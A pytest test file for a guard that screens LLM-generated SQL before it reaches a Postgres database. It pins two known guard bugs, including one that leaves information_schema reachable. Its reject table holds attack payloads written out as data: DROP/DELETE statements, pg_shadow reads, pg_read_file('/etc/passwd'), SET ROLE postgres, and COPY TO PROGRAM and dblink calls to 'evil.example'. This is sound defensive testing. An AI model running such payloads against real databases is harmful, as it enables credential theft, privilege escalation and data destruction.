"""Rejection matrix for the text-to-SQL guard (`agent/tools/sql_guard.py`).

The guard is the only thing between an LLM-authored string and the database,
so it gets a table of adversarial payloads rather than a couple of happy-path
checks. Pure unit tests: no DB, no network.

Two known guard defects are pinned with `xfail(strict=True)` so the suite stays
green today and turns red the moment somebody fixes them without updating the
expectations. Both are documented on the tests themselves.
"""

from __future__ import annotations

import pytest

from app.features.agent.tools.sql_guard import DEFAULT_ROW_CAP, GuardError, validate_and_normalize

# ── Payloads that MUST be rejected ───────────────────────────────────
#
# (test id, sql). Grouped by attack family; ids show up in pytest output so a
# regression names the family it belongs to.

REJECTED: list[tuple[str, str]] = [
    # --- plain DML/DDL: not a SELECT at all ---
    ("dml-delete", "DELETE FROM properties"),
    ("dml-update", "UPDATE properties SET title = 'pwned'"),
    ("dml-insert", "INSERT INTO properties (title) VALUES ('pwned')"),
    ("dml-merge", "MERGE INTO properties USING contacts ON true WHEN MATCHED THEN DELETE"),
    ("ddl-drop", "DROP TABLE properties"),
    ("ddl-create", "CREATE TABLE exfil (id int)"),
    ("ddl-alter", "ALTER TABLE properties ADD COLUMN exfil text"),
    ("ddl-truncate", "TRUNCATE properties"),
    ("ddl-grant", "GRANT SELECT ON properties TO PUBLIC"),
    # --- more than one statement in the payload ---
    ("multi-select-then-drop", "SELECT 1; DROP TABLE properties"),
    ("multi-select-then-delete", "SELECT id FROM properties; DELETE FROM contacts"),
    ("multi-hidden-by-comment", "SELECT 1 /* harmless */ ; DROP TABLE properties"),
    # --- writing CTEs: the SELECT wrapper does not launder the write ---
    ("cte-delete", "WITH gone AS (DELETE FROM properties RETURNING id) SELECT * FROM gone"),
    ("cte-insert", "WITH added AS (INSERT INTO contacts (full_name) VALUES ('x') RETURNING id) SELECT * FROM added"),
    ("cte-update", "WITH bumped AS (UPDATE tasks SET title = 'x' RETURNING id) SELECT * FROM bumped"),
    # --- system catalog reads ---
    ("catalog-pg-shadow", "SELECT * FROM pg_shadow"),
    ("catalog-pg-authid-qualified", "SELECT * FROM pg_catalog.pg_authid"),
    ("catalog-pg-class", "SELECT * FROM pg_class"),
    ("catalog-pg-policies", "SELECT * FROM pg_policies"),
    ("catalog-in-subquery", "SELECT (SELECT count(*) FROM pg_roles) FROM properties"),
    ("catalog-in-join", "SELECT p.id FROM properties p JOIN pg_stat_activity a ON true"),
    # --- UNION laundering against system tables ---
    ("union-pg-user", "SELECT id FROM properties UNION SELECT usename::uuid FROM pg_user"),
    ("union-hidden-by-comment", "SELECT id FROM properties -- trailing\nUNION SELECT usename::uuid FROM pg_user"),
    # --- functions outside the allowlist ---
    ("fn-pg-read-file", "SELECT pg_read_file('/etc/passwd')"),
    ("fn-pg-sleep", "SELECT pg_sleep(10)"),
    ("fn-current-setting", "SELECT current_setting('app.current_tenant_id')"),
    ("fn-set-config", "SELECT set_config('role', 'postgres', false)"),
    ("fn-dblink", "SELECT dblink('host=evil.example', 'SELECT 1')"),
    ("fn-lo-import", "SELECT lo_import('/etc/passwd')"),
    ("fn-query-to-xml", "SELECT query_to_xml('SELECT 1', true, true, '')"),
    ("fn-decode", "SELECT convert_from(decode('aGk=', 'base64'), 'utf8')"),
    ("fn-string-agg", "SELECT string_agg(title, ',') FROM properties"),
    # --- COPY / procedural / session-mutating commands ---
    ("copy-to-file", "COPY properties TO '/tmp/out.csv'"),
    ("copy-to-program", "COPY (SELECT * FROM properties) TO PROGRAM 'sh -c curl evil.example'"),
    ("do-block", "DO $$ BEGIN PERFORM 1; END $$"),
    ("set-role", "SET ROLE postgres"),
    ("set-local-role", "SET LOCAL role = postgres"),
    ("vacuum", "VACUUM properties"),
    # --- nothing parseable ---
    ("empty", ""),
    ("whitespace-only", "   "),
    ("semicolons-only", ";;"),
    ("not-sql", "not sql at all"),
]


@pytest.mark.parametrize("sql", [c[1] for c in REJECTED], ids=[c[0] for c in REJECTED])
def test_guard_rejects(sql: str) -> None:
    with pytest.raises(GuardError):
        validate_and_normalize(sql)


# ── Payloads that MUST be accepted ───────────────────────────────────

ACCEPTED: list[tuple[str, str]] = [
    ("plain-projection", "SELECT id, title FROM properties"),
    ("count-with-filter", "SELECT count(*) FROM contacts WHERE type = 'BUYER'"),
    ("join-two-tables", "SELECT p.title, c.full_name FROM properties p JOIN contacts c ON c.id = p.created_by"),
    ("aggregate-group-by", "SELECT status, count(*) FROM properties GROUP BY status ORDER BY 2 DESC"),
    ("order-by-star", "SELECT * FROM properties ORDER BY created_at DESC"),
    ("allowlisted-string-fn", "SELECT lower(title), upper(status::text) FROM properties"),
    ("subquery-on-domain-table", "SELECT (SELECT count(*) FROM tasks) AS n FROM properties"),
]


@pytest.mark.parametrize("sql", [c[1] for c in ACCEPTED], ids=[c[0] for c in ACCEPTED])
def test_guard_accepts_legitimate_selects(sql: str) -> None:
    out = validate_and_normalize(sql)
    assert out.lower().lstrip().startswith("select")


# ── LIMIT normalization ──────────────────────────────────────────────


def test_missing_limit_is_injected() -> None:
    assert validate_and_normalize("SELECT id FROM properties").endswith(f"LIMIT {DEFAULT_ROW_CAP}")


def test_limit_below_cap_is_preserved() -> None:
    assert validate_and_normalize("SELECT id FROM properties LIMIT 10").endswith("LIMIT 10")


def test_limit_above_cap_is_clamped() -> None:
    assert validate_and_normalize("SELECT id FROM properties LIMIT 5000").endswith(f"LIMIT {DEFAULT_ROW_CAP}")


def test_row_cap_is_configurable() -> None:
    assert validate_and_normalize("SELECT id FROM properties", row_cap=5).endswith("LIMIT 5")


def test_trailing_semicolon_is_tolerated() -> None:
    assert validate_and_normalize("SELECT id FROM properties;").endswith(f"LIMIT {DEFAULT_ROW_CAP}")


# ── Known guard defects (pinned) ─────────────────────────────────────
#
# `xfail(strict=True)`: an unexpected PASS fails the suite, so these flip to a
# green regression test as soon as sql_guard is fixed.

INFORMATION_SCHEMA_PAYLOADS: list[tuple[str, str]] = [
    ("is-columns", "SELECT table_name, column_name FROM information_schema.columns"),
    ("is-tables", "SELECT * FROM information_schema.tables"),
    ("is-grants", "SELECT * FROM information_schema.role_table_grants"),
    ("is-quoted", 'SELECT * FROM "information_schema"."columns"'),
    ("is-joined-with-domain-table", "SELECT c.column_name FROM information_schema.columns c JOIN properties p ON true"),
]


@pytest.mark.xfail(
    strict=True,
    reason=(
        "sql_guard bug: FORBIDDEN_TABLE_PREFIXES is matched against exp.Table.name (the bare "
        "relation), but for a schema-qualified name the schema lives in .db — so the "
        "'information_schema' prefix can never match and the whole schema stays reachable. "
        "pg_* is blocked only incidentally, because those relation names start with pg_. "
        "Fix: check table.db and table.catalog too."
    ),
)
@pytest.mark.parametrize(
    "sql",
    [c[1] for c in INFORMATION_SCHEMA_PAYLOADS],
    ids=[c[0] for c in INFORMATION_SCHEMA_PAYLOADS],
)
def test_guard_rejects_information_schema(sql: str) -> None:
    with pytest.raises(GuardError):
        validate_and_normalize(sql)


# Postgres name -> sqlglot canonical name the allowlist check actually sees.
ALLOWLISTED_BUT_REJECTED: list[tuple[str, str]] = [
    ("date_trunc", "SELECT date_trunc('month', created_at) FROM interactions"),
    ("to_char", "SELECT to_char(created_at, 'YYYY-MM') FROM interactions"),
    ("to_date", "SELECT to_date('2026-01-01', 'YYYY-MM-DD')"),
    ("to_timestamp", "SELECT to_timestamp(0)"),
    ("age", "SELECT age(created_at) FROM properties"),
]


@pytest.mark.xfail(
    strict=True,
    reason=(
        "sql_guard bug: the allowlist is compared against sqlglot's canonical sql_name() "
        "(date_trunc -> timestamp_trunc, to_char -> time_to_str, to_date -> str_to_date, "
        "to_timestamp -> unix_to_time, age -> anonymous), not the Postgres spelling, so five "
        "functions listed in ALLOWED_FUNCTIONS are rejected. date_trunc breaks every "
        "'agrupado por mes' question the agent is meant to answer."
    ),
)
@pytest.mark.parametrize(
    "sql",
    [c[1] for c in ALLOWLISTED_BUT_REJECTED],
    ids=[c[0] for c in ALLOWLISTED_BUT_REJECTED],
)
def test_allowlisted_functions_are_accepted(sql: str) -> None:
    validate_and_normalize(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT count(*) FROM properties",
        "SELECT sum(list_price_cents) FROM properties",
        "SELECT min(created_at), max(created_at) FROM properties",
        "SELECT extract(year FROM created_at) FROM properties",
        "SELECT date_part('year', created_at) FROM properties",
        "SELECT coalesce(title, '(sin titulo)') FROM properties",
        "SELECT nullif(title, '') FROM properties",
        "SELECT concat(title, ' - ', status::text) FROM properties",
        "SELECT trim(title) FROM properties",
        "SELECT now()",
    ],
)
def test_allowlisted_functions_that_do_work(sql: str) -> None:
    """The subset of ALLOWED_FUNCTIONS whose Postgres name survives sqlglot."""
    validate_and_normalize(sql)
